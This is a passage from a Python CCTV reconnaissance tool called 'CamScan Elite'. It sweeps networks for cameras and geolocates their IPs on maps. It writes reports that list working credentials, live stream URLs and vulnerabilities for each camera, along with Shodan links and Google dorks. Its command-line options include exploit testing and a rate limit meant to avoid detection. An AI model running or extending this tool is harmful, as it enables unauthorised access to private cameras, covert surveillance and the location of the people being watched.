        # Configuration factors
        if "Unknown" in result.camera_brand:
            score += 10
        
        return min(100, score)
    
    async def _get_ip_location(self, ip: str) -> Dict[str, Any]:
        """Get IP location information"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}") as response:
                    data = await response.json()
                    if data.get('status') == 'success':
                        return {
                            'country': data.get('country', 'Unknown'),
                            'region': data.get('regionName', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'zip': data.get('zip', 'Unknown'),
                            'lat': data.get('lat', 0),
                            'lon': data.get('lon', 0),
                            'isp': data.get('isp', 'Unknown'),
                            'org': data.get('org', 'Unknown'),
                        }
        except Exception:
            pass
        
        return {}
    
    async def _get_geolocation(self, ip: str) -> Dict[str, Any]:
        """Get geolocation data"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ipapi.co/{ip}/json/") as response:
                    data = await response.json()
                    return {
                        'google_maps': f"https://maps.google.com/?q={data.get('latitude', 0)},{data.get('longitude', 0)}",
                        'google_earth': f"https://earth.google.com/web/@{data.get('latitude', 0)},{data.get('longitude', 0)}",
                        'latitude': data.get('latitude', 0),
                        'longitude': data.get('longitude', 0),
                    }
        except Exception:
            return {}
    
    def _print_progress(self):
        """Display scanning progress"""
        progress = (self.scanned_ports / self.total_ports) * 100
        elapsed = time.time() - self.start_time
        print(f"\r    Scanned {self.scanned_ports}/{self.total_ports} ports... (Elapsed: {elapsed:.1f}s)", end="", flush=True)
    
    def generate_report(self, results: List[ScanResult], format: str = "markdown") -> str:
        """Generate comprehensive security report"""
        if format == "markdown":
            return self._generate_markdown_report(results)
        elif format == "json":
            return self._generate_json_report(results)
        elif format == "csv":
            return self._generate_csv_report(results)
        else:
            return self._generate_markdown_report(results)
    
    def _generate_markdown_report(self, results: List[ScanResult]) -> str:
        """Generate detailed markdown report"""
        report = []
        report.append("# CAMSCAN ELITE - Security Assessment Report")
        report.append(f"## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"## Scan Summary")
        report.append(f"- **Total Cameras Found**: {len(results)}")
        report.append(f"- **Credentials Discovered**: {self.stats['credentials_found']}")
        report.append(f"- **Vulnerabilities Identified**: {self.stats['vulnerabilities_found']}")
        report.append(f"- **Live Streams Detected**: {self.stats['streams_detected']}")
        report.append("")
        
        for i, result in enumerate(results, 1):
            risk_color = "🟢" if result.risk_score < 30 else "🟡" if result.risk_score < 70 else "🔴"
            
            report.append(f"## Camera {i}: {result.ip}:{result.port} {risk_color} (Risk: {result.risk_score}%)")
            report.append("```")
            report.append(f"IP Address: {result.ip}")
            report.append(f"Port: {result.port}")
            report.append(f"Protocol: {result.protocol}")
            report.append(f"Service: {result.service}")
            report.append(f"Server: {result.banner}")
            report.append(f"Camera Brand: {result.camera_brand}")
            report.append(f"Model: {result.model}")
            report.append(f"Firmware: {result.firmware}")
            report.append(f"Requires Auth: {result.requires_auth}")
            report.append(f"Response Time: {result.response_time:.2f}s")
            report.append(f"Login URL: {result.login_url}")
            report.append(f"Stream URL: {result.stream_url}")
            report.append("")
            
            if result.credentials:
                report.append("WORKING CREDENTIALS:")
                for username, password in result.credentials:
                    report.append(f"  🔑 {username}:{password}")
            else:
                report.append("Credentials: No working credentials found")
            
            report.append("")
            
            if result.location_info:
                report.append("LOCATION INFORMATION:")
                for key, value in result.location_info.items():
                    if key not in ['lat', 'lon']:
                        report.append(f"  {key}: {value}")
            
            report.append("")
            
            if result.vulnerabilities:
                report.append("SECURITY VULNERABILITIES:")
                for vuln in result.vulnerabilities:
                    report.append(f"  ⚠️  {vuln}")
            else:
                report.append("Vulnerabilities: No critical vulnerabilities detected")
            
            report.append("")
            
            if result.endpoints:
                report.append("DISCOVERED ENDPOINTS:")
                for endpoint in result.endpoints[:10]:  # Limit to first 10
                    report.append(f"  {endpoint}")
            
            report.append("```")
            report.append("")
        
        # Investigation section
        report.append("## Further Investigation")
        report.append("### Shodan Search Links:")
        for result in results:
            report.append(f"- https://www.shodan.io/search?query=ip:{result.ip}")
        
        report.append("")
        report.append("### Google Dorking Suggestions:")
        dorks = [
            f"inurl:/view.shtml {result.ip}",
            f"inurl:/webcam.html {result.ip}",
            f"inurl:/video.mjpg {result.ip}",
            f"inurl:/axis-cgi {result.ip}",
            f"intitle:\"webcam\" {result.ip}",
            f"intitle:\"camera\" {result.ip}",
        ]
        for dork in dorks[:5]:
            report.append(f"- `{dork}`")
        
        return "\n".join(report)
    
    def _generate_json_report(self, results: List[ScanResult]) -> str:
        """Generate JSON report"""
        report_data = {
            "scan_metadata": {
                "timestamp": datetime.now().isoformat(),
                "scanner": "CamScan Elite v5.0.0",
                "total_cameras": len(results),
                "statistics": self.stats
            },
            "cameras": []
        }
        
        for result in results:
            camera_data = {
                "ip": result.ip,
                "port": result.port,
                "protocol": result.protocol,
                "service": result.service,
                "camera_brand": result.camera_brand,
                "model": result.model,
                "firmware": result.firmware,
                "requires_auth": result.requires_auth,
                "login_url": result.login_url,
                "stream_url": result.stream_url,
                "credentials": result.credentials,
                "location_info": result.location_info,
                "vulnerabilities": result.vulnerabilities,
                "risk_score": result.risk_score,
                "response_time": result.response_time
            }
            report_data["cameras"].append(camera_data)
        
        return json.dumps(report_data, indent=2)
    
    def _generate_csv_report(self, results: List[ScanResult]) -> str:
        """Generate CSV report"""
        import io
        output = io.StringIO()
        writer = csv.writer(output)
        
        writer.writerow([
            'IP', 'Port', 'Protocol', 'Brand', 'Model', 'Firmware',
            'Requires Auth', 'Login URL', 'Stream URL', 'Credentials',
            'Country', 'City', 'Vulnerabilities', 'Risk Score', 'Response Time'
        ])
        
        for result in results:
            credentials_str = '; '.join([f"{u}:{p}" for u, p in result.credentials])
            vulnerabilities_str = '; '.join(result.vulnerabilities)
            
            writer.writerow([
                result.ip,
                result.port,
                result.protocol,
                result.camera_brand,
                result.model,
                result.firmware,
                result.requires_auth,
                result.login_url,
                result.stream_url,
                credentials_str,
                result.location_info.get('country', 'Unknown'),
                result.location_info.get('city', 'Unknown'),
                vulnerabilities_str,
                result.risk_score,
                f"{result.response_time:.2f}"
            ])
        
        return output.getvalue()
    
    def save_report(self, results: List[ScanResult], filename: str = None, format: str = "markdown"):
        """Save report to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"camscan_elite_report_{timestamp}.{format}"
        
        filepath = self.output_dir / filename
        report_content = self.generate_report(results, format)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        logger.info(f"📄 Comprehensive report saved to: {filepath}")
        return filepath
    
    def print_statistics(self):
        """Print scan statistics"""
        elapsed = time.time() - self.start_time
        print(f"\n{'='*60}")
        print(f"📊 SCAN STATISTICS")
        print(f"{'='*60}")
        print(f"⏰ Duration: {elapsed:.2f} seconds")
        print(f"🔍 Ports Scanned: {self.scanned_ports}")
        print(f"📹 Cameras Found: {self.stats['cameras_found']}")
        print(f"🔑 Credentials Discovered: {self.stats['credentials_found']}")
        print(f"⚠️  Vulnerabilities Identified: {self.stats['vulnerabilities_found']}")
        print(f"📺 Live Streams Detected: {self.stats['streams_detected']}")
        print(f"{'='*60}")

class AdvancedScanModes:
    """Advanced scanning modes for enterprise reconnaissance"""
    
    @staticmethod
    async def network_scan(network_cidr: str, max_threads: int = 200) -> List[str]:
        """Enterprise-grade network scanning"""
        try:
            network = ipaddress.ip_network(network_cidr, strict=False)
            active_ips = []
            
            logger.info(f"🌐 Scanning network {network_cidr} ({network.num_addresses} addresses)")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = {
                    executor.submit(AdvancedScanModes._ping_ip, str(ip)): str(ip) 
                    for ip in network.hosts()
                }
                
                for future in concurrent.futures.as_completed(futures):
                    ip = futures[future]
                    try:
                        if future.result():
                            active_ips.append(ip)
                            print(f"✅ Active host found: {ip}")
                    except Exception as e:
                        logger.debug(f"Error pinging {ip}: {e}")
            
            return active_ips
        except ValueError as e:
            logger.error(f"Invalid network CIDR: {e}")
            return []
    
    @staticmethod
    def _ping_ip(ip: str) -> bool:
        """Enhanced IP ping with multiple ports"""
        ports = [80, 443, 554, 8080, 8000]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return True
            except:
                continue
        return False

def setup_argparse() -> argparse.ArgumentParser:
    """Setup enterprise command line interface"""
    parser = argparse.ArgumentParser(
        description="CAMSCAN ELITE - Premium CCTV Reconnaissance Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python camscan_elite.py 192.168.1.1
  python camscan_elite.py 192.168.1.0/24 --format json
  python camscan_elite.py 192.168.1.1 --threads 200 --timeout 5
  python camscan_elite.py targets.txt --output scan_report --deep-scan
  python camscan_elite.py 192.168.1.1 --enable-exploits --rate-limit 0.01

Advanced Features:
  --enable-exploits    Test for known exploits (Educational only)
  --deep-scan          Perform comprehensive endpoint discovery
  --rate-limit         Control request rate to avoid detection
        """
    )
    
    parser.add_argument('target', help='Target IP, network CIDR, or file containing targets')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout in seconds (default: 8)')
    parser.add_argument('-o', '--output', help='Output filename')
    parser.add_argument('-f', '--format', choices=['markdown', 'json', 'csv'], 
                       default='markdown', help='Output format (default: markdown)')
    parser.add_argument('--rate-limit', type=float, default=0.05, 
                       help='Rate limit between requests (default: 0.05)')
    parser.add_argument('--enable-exploits', action='store_true', 
                       help='Enable exploit testing (Educational purposes only)')
    parser.add_argument('--deep-scan', action='store_true', 
                       help='Perform comprehensive endpoint discovery')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    return parser

async def main():
    """Enterprise main execution function"""
    parser = setup_argparse()
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize elite scanner
    scanner = CamScanElite(
        max_threads=args.threads,
        timeout=args.timeout,
        rate_limit=args.rate_limit,
        enable_exploits=args.enable_exploits,
        deep_scan=args.deep_scan
    )
    
    # Display banner
    scanner.print_banner()
    
    all_results = []
    
    # Process targets
    if '/' in args.target:
        # Network scan
        logger.info(f"🔍 Performing enterprise network scan on {args.target}")
        active_ips = await AdvancedScanModes.network_scan(args.target, args.threads)
        logger.info(f"🌐 Found {len(active_ips)} active hosts")
        
        for ip in active_ips:
            try:
                results = await scanner.scan_ip(ip)
                all_results.extend(results)
            except Exception as e:
                logger.error(f"Error scanning {ip}: {e}")
    
    elif os.path.isfile(args.target):
        # File with targets
        logger.info(f"📁 Reading targets from file: {args.target}")
        with open(args.target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        for target in targets:
            if '/' in target:
                # Network in file
                active_ips = await AdvancedScanModes.network_scan(target, args.threads)
                for ip in active_ips:
                    try:
                        results = await scanner.scan_ip(ip)
                        all_results.extend(results)
                    except Exception as e:
                        logger.error(f"Error scanning {ip}: {e}")
            else:
                # Single IP in file
                try:
                    results = await scanner.scan_ip(target)
                    all_results.extend(results)
                except Exception as e:
                    logger.error(f"Error scanning {target}: {e}")
    else:
        # Single IP
        try:
            all_results = await scanner.scan_ip(args.target)
        except Exception as e:
            logger.error(f"Error scanning {args.target}: {e}")
            return
    
    # Generate results
    if all_results:
        filename = scanner.save_report(all_results, args.output, args.format)
        scanner.print_statistics()
        
        # Print quick summary
        print(f"\n🎯 QUICK SUMMARY:")
        for result in all_results:
            risk_indicator = "🟢" if result.risk_score < 30 else "🟡" if result.risk_score < 70 else "🔴"
            auth_status = "🔓" if not result.requires_auth else "🔐"
            cred_status = f" ({len(result.credentials)}🔑)" if result.credentials else ""
            print(f"   {risk_indicator} {result.ip}:{result.port} - {result.camera_brand} - {auth_status}{cred_status}")
        
        print(f"\n📄 Full report: {filename}")
    else:
        print("\n❌ No cameras discovered during scan.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"💥 Critical error: {e}")
        sys.exit(1)